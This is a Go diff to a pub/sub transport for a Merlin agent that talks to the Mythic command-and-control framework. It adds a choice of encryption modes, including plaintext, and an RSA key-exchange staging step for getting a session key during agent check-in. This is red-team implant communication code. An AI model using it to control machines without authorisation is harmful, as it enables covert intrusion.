@@ -43,6 +43,7 @@ type PubSubClient struct {
 	transport   *Transport
 	agentID     string // current Mythic UUID (starts as payloadID, updated to callback UUID after checkin)
 	payloadUUID string // original payload UUID (never changes, used for Merlin internal message IDs)
+	stagingUUID string // staging UUID from RSA key exchange (used for frame UUID until checkin completes)
 	instanceID  string // unique per-process ID for routing (prevents same-UUID collision)
 	config      map[string]interface{}
 	messages    chan interface{}
@@ -50,16 +51,19 @@ type PubSubClient struct {
 	mu          sync.Mutex
 	running     bool
 
-	// AES encryption with static PSK (same approach as HTTP agent)
-	psk             []byte // 32-byte AES key from Mythic's AESPSK parameter
+	// Encryption settings
+	encryptionMode  string // "aes256_hmac", "rsa", or "none"
+	psk             []byte // 32-byte AES key (nil for plaintext mode)
 	initialChan     chan map[string]interface{}
 	checkinDone     bool
 	listenerStarted bool
+	usedRSAStaging  bool // true if key was obtained via RSA staging
 }
 
 // NewPubSubClient creates a new pub/sub client for Merlin.
 // pskB64 is the base64-encoded 32-byte AES key from Mythic's AESPSK parameter.
-func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient, error) {
+// encMode determines encryption: "aes256_hmac" (use PSK), "rsa" (RSA key exchange), "none" (plaintext).
+func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string) (*PubSubClient, error) {
 	instanceID := uuid.New().String()
 
 	if core.Verbose {
@@ -67,9 +71,17 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
 	}
 
-	// Decode PSK
+	// Handle encryption mode
 	var pskKey []byte
-	if pskB64 != "" {
+	if encMode == "" {
+		encMode = "aes256_hmac" // Default to PSK mode for backward compatibility
+	}
+
+	switch encMode {
+	case "aes256_hmac":
+		if pskB64 == "" {
+			return nil, fmt.Errorf("PSK required for aes256_hmac mode but not provided")
+		}
 		var err error
 		pskKey, err = base64.StdEncoding.DecodeString(pskB64)
 		if err != nil {
@@ -79,12 +91,18 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 			return nil, fmt.Errorf("PSK must be 32 bytes, got %d", len(pskKey))
 		}
 		if core.Verbose {
-			color.Green("[+] AES-256 PSK loaded successfully")
+			color.Green("[+] AES-256 PSK loaded successfully (static PSK mode)")
 		}
-	} else {
+	case "rsa":
 		if core.Verbose {
-			color.Yellow("[!] No PSK configured — messages will be sent in plaintext")
+			color.Cyan("[*] RSA key exchange mode — will perform staging to obtain AES key")
 		}
+	case "none":
+		if core.Verbose {
+			color.Yellow("[*] Plaintext mode — NO ENCRYPTION (for testing only)")
+		}
+	default:
+		return nil, fmt.Errorf("unknown encryption mode: %s", encMode)
 	}
 
 	transport, err := NewTransport(cfg, instanceID, agentID)
@@ -93,15 +111,16 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 	}
 
 	client := &PubSubClient{
-		transport:   transport,
-		agentID:     agentID,
-		payloadUUID: agentID,
-		instanceID:  instanceID,
-		config:      make(map[string]interface{}),
-		messages:    make(chan interface{}, 100),
-		pendingJobs: make([]messages.Base, 0),
-		running:     false,
-		psk:         pskKey,
+		transport:      transport,
+		agentID:        agentID,
+		payloadUUID:    agentID,
+		instanceID:     instanceID,
+		config:         make(map[string]interface{}),
+		messages:       make(chan interface{}, 100),
+		pendingJobs:    make([]messages.Base, 0),
+		running:        false,
+		encryptionMode: encMode,
+		psk:            pskKey,
 	}
 
 	return client, nil
@@ -135,14 +154,13 @@ func (p *PubSubClient) Set(key string, value string) error {
 	return nil
 }
 
-// Initial performs the encrypted checkin with Mythic using the static PSK.
+// Initial performs the checkin with Mythic.
+// If PSK is set (aes256_hmac mode), uses static PSK for encryption.
+// If PSK is nil (none mode), performs RSA key exchange staging first.
 func (p *PubSubClient) Initial() error {
 	time.Sleep(2 * time.Second)
-	if core.Verbose {
-		color.Cyan("[*] Starting encrypted checkin via PubSub (static PSK mode)")
-	}
 
-	// Create channel for synchronous checkin response
+	// Create channel for synchronous responses
 	p.initialChan = make(chan map[string]interface{}, 10)
 
 	// Start transport listener goroutine ONCE
@@ -166,6 +184,34 @@ func (p *PubSubClient) Initial() error {
 				}
 			}
 		}()
+	}
+
+	// Handle encryption based on mode
+	switch p.encryptionMode {
+	case "aes256_hmac":
+		if core.Verbose {
+			color.Cyan("[*] Using static PSK for encryption")
+		}
+	case "rsa":
+		if core.Verbose {
+			color.Cyan("[*] Starting RSA key exchange staging...")
+		}
+		if err := p.performRSAStaging(); err != nil {
+			return fmt.Errorf("RSA staging failed: %w", err)
+		}
+		p.usedRSAStaging = true
+		if core.Verbose {
+			color.Green("[+] RSA staging complete — AES key obtained")
+		}
+	case "none":
+		if core.Verbose {
+			color.Yellow("[*] Plaintext mode — skipping encryption setup")
+		}
+	}
+
+	// Now perform encrypted checkin
+	if core.Verbose {
+		color.Cyan("[*] Sending encrypted checkin...")
 	}
 
 	// Build checkin JSON
@@ -204,20 +250,32 @@ func (p *PubSubClient) Initial() error {
 		return fmt.Errorf("failed to marshal checkin: %w", err)
 	}
 
-	if core.Verbose {
-		color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin with UUID: %s", p.agentID))
+	// Determine which UUID to use for the frame
+	// - RSA staging mode: use stagingUUID (so Mythic can find the encryption key)
+	// - PSK/plaintext mode: use agentID (payload UUID)
+	frameUUID := p.agentID
+	if p.stagingUUID != "" {
+		frameUUID = p.stagingUUID
 	}
 
-	// Build Mythic frame: base64(payloadUUID + [encrypted] body)
+	// Build Mythic frame based on encryption mode
 	var frame string
-	if p.psk != nil {
+	if p.encryptionMode == "none" {
+		// Plaintext mode - no encryption
+		if core.Verbose {
+			color.Yellow(fmt.Sprintf("[*] Sending plaintext checkin (frame UUID: %s)", frameUUID))
+		}
+		frame = buildMythicFrame(frameUUID, checkinJSON)
+	} else {
+		// Encrypted mode (aes256_hmac or rsa)
+		if core.Verbose {
+			color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
+		}
 		encrypted, err := aesEncrypt(p.psk, checkinJSON)
 		if err != nil {
 			return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
 		}
-		frame = buildMythicFrame(p.agentID, encrypted)
-	} else {
-		frame = buildMythicFrame(p.agentID, checkinJSON)
+		frame = buildMythicFrame(frameUUID, encrypted)
 	}
 
 	// Send
@@ -245,19 +303,21 @@ func (p *PubSubClient) Initial() error {
 		return fmt.Errorf("failed to parse checkin response frame: %w", err)
 	}
 
-	// Decrypt if PSK is set
+	// Decrypt response (skip for plaintext mode)
 	var plaintext []byte
-	if p.psk != nil {
+	if p.encryptionMode == "none" {
+		plaintext = body
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Plaintext checkin response: %s", string(plaintext)))
+		}
+	} else {
 		plaintext, err = aesDecrypt(p.psk, body)
 		if err != nil {
 			return fmt.Errorf("failed to AES-decrypt checkin response: %w", err)
 		}
-	} else {
-		plaintext = body
-	}
-
-	if core.Debug {
-		color.Yellow(fmt.Sprintf("[DEBUG] Decrypted checkin response: %s", string(plaintext)))
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Decrypted checkin response: %s", string(plaintext)))
+		}
 	}
 
 	// Parse JSON to extract callback UUID
@@ -281,11 +341,129 @@ func (p *PubSubClient) Initial() error {
 	p.agentID = newID
 	p.transport.agentID = newID
 
+	// Clear staging UUID - no longer needed after successful checkin
+	p.stagingUUID = ""
+
 	// Mark checkin as done — future messages go to p.messages
 	p.checkinDone = true
 
 	if core.Verbose {
 		color.Green(fmt.Sprintf("[+] Checkin successful — UUID updated from %s to %s", oldID, newID))
+	}
+
+	return nil
+}
+
+// performRSAStaging performs the Mythic staging_rsa key exchange to obtain an AES key.
+func (p *PubSubClient) performRSAStaging() error {
+	// Generate RSA key pair
+	privKey, pubKeyDER, err := generateRSAKeyPair()
+	if err != nil {
+		return fmt.Errorf("failed to generate RSA key pair: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Generated RSA key pair, public key size: %d bytes", len(pubKeyDER)))
+	}
+
+	// Build staging_rsa message
+	sessionID := uuid.New().String()
+	stagingMsg := map[string]interface{}{
+		"action":     "staging_rsa",
+		"pub_key":    base64.StdEncoding.EncodeToString(pubKeyDER),
+		"session_id": sessionID,
+	}
+	stagingJSON, err := json.Marshal(stagingMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal staging_rsa message: %w", err)
+	}
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Sending staging_rsa with session_id: %s", sessionID))
+	}
+
+	// Build Mythic frame: base64(payloadUUID + plaintext_staging_body)
+	// Note: staging_rsa is sent in plaintext (no encryption yet)
+	frame := buildMythicFrame(p.agentID, stagingJSON)
+
+	// Send
+	if err := p.transport.SendRaw(frame); err != nil {
+		return fmt.Errorf("failed to send staging_rsa: %w", err)
+	}
+
+	// Wait for response
+	var resp map[string]interface{}
+	select {
+	case resp = <-p.initialChan:
+	case <-time.After(30 * time.Second):
+		return fmt.Errorf("timeout waiting for staging_rsa response")
+	}
+
+	// Extract "message" field from wrapper
+	encodedMsg, ok := resp["message"].(string)
+	if !ok {
+		return fmt.Errorf("staging_rsa response missing 'message' field")
+	}
+
+	// Parse Mythic frame
+	_, body, err := parseMythicFrame(encodedMsg)
+	if err != nil {
+		return fmt.Errorf("failed to parse staging_rsa response frame: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Received staging_rsa response, body size: %d bytes", len(body)))
+	}
+
+	// Mythic returns JSON with session_key field containing base64-encoded RSA-encrypted key
+	var stagingResp struct {
+		UUID       string `json:"uuid"`
+		SessionID  string `json:"session_id"`
+		SessionKey string `json:"session_key"`
+		Action     string `json:"action"`
+	}
+	if err := json.Unmarshal(body, &stagingResp); err != nil {
+		return fmt.Errorf("failed to parse staging_rsa response JSON: %w", err)
+	}
+
+	if stagingResp.SessionKey == "" {
+		return fmt.Errorf("staging_rsa response missing session_key field")
+	}
+
+	if stagingResp.UUID == "" {
+		return fmt.Errorf("staging_rsa response missing uuid field")
+	}
+
+	// Base64 decode the session_key
+	encryptedKey, err := base64.StdEncoding.DecodeString(stagingResp.SessionKey)
+	if err != nil {
+		return fmt.Errorf("failed to base64 decode session_key: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Decoded session_key, encrypted size: %d bytes", len(encryptedKey)))
+	}
+
+	// RSA decrypt to get the AES key
+	aesKey, err := rsaDecryptOAEP(privKey, encryptedKey)
+	if err != nil {
+		return fmt.Errorf("failed to RSA-decrypt AES key: %w", err)
+	}
+
+	if len(aesKey) != 32 {
+		return fmt.Errorf("expected 32-byte AES key, got %d bytes", len(aesKey))
+	}
+
+	// Store the AES key
+	p.psk = aesKey
+
+	// Save the staging UUID - this is needed for building frames so Mythic can find the encryption key.
+	// The payloadUUID stays in agentID and is used inside the JSON body for payload lookup.
+	p.stagingUUID = stagingResp.UUID
+
+	if core.Verbose {
+		color.Green("[+] Successfully obtained 32-byte AES key via RSA staging")
+		color.Green(fmt.Sprintf("[+] Staging UUID: %s", p.stagingUUID))
 	}
 
 	return nil
@@ -437,9 +615,11 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 					continue
 				}
 
-				// Decrypt
+				// Decrypt (skip for plaintext mode)
 				var plaintext []byte
-				if p.psk != nil {
+				if p.encryptionMode == "none" {
+					plaintext = body
+				} else if p.psk != nil {
 					plaintext, err = aesDecrypt(p.psk, body)
 					if err != nil {
 						if core.Verbose {
@@ -448,7 +628,10 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 						continue
 					}
 				} else {
-					plaintext = body
+					if core.Verbose {
+						color.Red("[-] No encryption key available but encryption mode is not 'none'")
+					}
+					continue
 				}
 
 				// Parse JSON
@@ -499,7 +682,7 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 	return pendingJobs, nil
 }
 
-// Send sends a Merlin message to Mythic, AES-encrypted and framed.
+// Send sends a Merlin message to Mythic, encrypted (or plaintext) and framed.
 func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 	if core.Debug {
 		color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
@@ -514,16 +697,20 @@ func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 		return nil, fmt.Errorf("failed to marshal message: %w", err)
 	}
 
-	// Build Mythic frame: base64(callbackUUID + [encrypted] body)
+	// Build Mythic frame based on encryption mode
 	var frame string
-	if p.psk != nil {
+	if p.encryptionMode == "none" {
+		// Plaintext mode
+		frame = buildMythicFrame(p.agentID, jsonBody)
+	} else if p.psk != nil {
+		// Encrypted mode (aes256_hmac or rsa)
 		encrypted, err := aesEncrypt(p.psk, jsonBody)
 		if err != nil {
 			return nil, fmt.Errorf("failed to AES-encrypt message: %w", err)
 		}
 		frame = buildMythicFrame(p.agentID, encrypted)
 	} else {
-		frame = buildMythicFrame(p.agentID, jsonBody)
+		return nil, fmt.Errorf("no encryption key available for mode: %s", p.encryptionMode)
 	}
 
 	// Send via transport
@@ -531,8 +718,14 @@ func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 		return nil, fmt.Errorf("failed to send: %w", err)
 	}
 
-	if core.Verbose {
-		color.Green("[+] Encrypted message sent successfully")
+	if p.encryptionMode == "none" {
+		if core.Verbose {
+			color.Yellow("[+] Plaintext message sent")
+		}
+	} else {
+		if core.Verbose {
+			color.Green("[+] Encrypted message sent successfully")
+		}
 	}
 
 	return []messages.Base{}, nil
